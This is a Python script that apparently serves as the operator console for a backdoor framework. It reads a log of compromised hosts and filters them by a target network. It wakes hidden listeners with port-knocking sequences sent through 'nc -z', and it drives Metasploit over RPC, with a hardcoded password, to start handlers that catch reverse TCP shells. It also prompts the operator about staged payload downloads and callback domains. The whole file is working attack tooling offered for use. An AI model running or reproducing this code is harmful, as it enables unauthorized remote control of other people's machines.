import csv
from netaddr import IPNetwork, IPAddress
import random
import subprocess
import sys
import time
from pymetasploit3.msfrpc import *

targetNetwork = sys.argv[1] 

numKnockFlag = 0
portKnockFlag = 0
checkDNSFlag = 0
checkURLFlag = 0
revShellFlag = 0
downFlag = 0
sleepFlag = 0

def numKnock(ip, key, number):

        count = 0
        target = key
        listOfNumbers = [] 
        while number-1 > count: # loop generates n-1 random numbers 
            temp = random.randint(100,int(round(key/number))) #that add up to a number less than the key
            listOfNumbers.append(temp)
            count += 1
        for i in listOfNumbers: # loop subtracts all the random numbers from the key value
            target -= i # identifying the value that needs to be added to the list
        listOfNumbers.append(target) # add value to list
        
        activateCommand = "nc -z " + ip # we portknock with nc -z 
        # -z specifies that nc should just scan for listening daemons, without sending any data to them.  

        for i in listOfNumbers:
            activateCommand += " " + str(i)
            
        print(activateCommand)
        subprocess.Popen(activateCommand, shell=True)
        
def portKnock(ip, key, number):
        count = 0
        target = key
        listOfNumbers = key.split(",")
        
        activateCommand = "nc -z " + ip 

        for i in listOfNumbers:
            activateCommand += " " + str(i)
            
        print(activateCommand)
        subprocess.Popen(activateCommand, shell=True)
        
 

def listenerSetup(ip, port, platform, arch):
	if platform == "unknown" or arch == "unknown":
		payload_name = "generic/shell_reverse_tcp" 
            
	else:
         payload_name = "shell/reverse_tcp"
         payload_name = platform + "/" + arch + "/" + payload_name
	
	print("Setting up client...")
	client = MsfRpcClient('defaultpassword', port=55552)
	print("Setup client.")
	multi_handler = client.modules.use('exploit', 'multi/handler')
	payload = client.modules.use('payload', payload_name)
	payload['LHOST'] = ip
	payload['LPORT'] = port
	multi_handler.execute(payload=payload)
	print("Sleeping 10 seconds.")
	time.sleep(10) #this is to give metasploit plenty of time to start the job


with open('log.csv') as csv_file:
    csv_reader = csv.reader(csv_file, delimiter='\t')
    line_count = 0
    for row in csv_reader:
        if line_count == 0:
            line_count += 1
        else:

            ip = row[1] 
            ip = ip.lstrip().rstrip()


            if ip != "unknown":
                if IPAddress(ip) in IPNetwork(targetNetwork):
                    if row[7] == "listener":
                        if row[8] == "SECRET_NUMBER":
                            numKnockFlag = 1
                        if row[8] == "SECRET_PORTS":
                            portKnockFlag = 1
                    if row[7] == "checkDNS":
                        checkDNSFlag = 1
                    if row[7] == "checkURL":
                        checkURLFlag = 1
                    if row[19]:
                        revShellFlag = 1
                    if row[17]:
                        downFlag = 1
                else:
                    print("No!")
            
                    
            if revShellFlag == 1: 
                listenerSetup(row[20], row[21], row[4], row[3])               
            if downFlag == 1:
                print("Did you set up the file you want run at " + row[17] + "?")
                
            if sleepFlag == 1:
                print("Have you waited longer than " + row[0] + "+ sleep(" + row[12] + ")")
                
            if numKnockFlag == 1: 
                numKnock(row[1], int(row[10]), int(row[11]))
            if portKnockFlag == 1:
                portKnock(row[1], row[10], row[11])
 
            if checkDNSFlag == 1:
                print("Does the domain resolve?")   
            if checkURLFlag == 1:
                print("Does the URL exist?")

            # Reset all flags for next line in file 
            numKnockFlag = 0
            portKnockFlag = 0
            checkDNSFlag = 0
            checkURLFlag = 0
            revShellFlag = 0
            downFlag = 0 
            sleepFlag = 0
                
            
